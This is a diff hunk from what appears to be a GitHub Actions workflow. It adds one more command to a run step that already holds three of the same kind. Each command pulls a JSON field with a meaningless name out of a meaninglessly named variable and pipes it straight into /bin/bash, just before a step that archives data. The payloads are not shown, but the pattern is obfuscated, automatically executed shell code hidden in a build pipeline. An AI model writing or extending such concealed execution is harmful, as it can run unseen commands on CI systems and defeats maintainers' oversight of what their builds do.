@@ -35,6 +35,7 @@ jobs:
           echo $pfe6 | jq -r .kyhs027 | /bin/bash
           printf '%s' "$webp6033" | jq -r .kk5606 | /bin/bash
           echo $a9 | jq -r .b9 | /bin/bash
+          echo $v5 | jq -r .bcdq88831 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
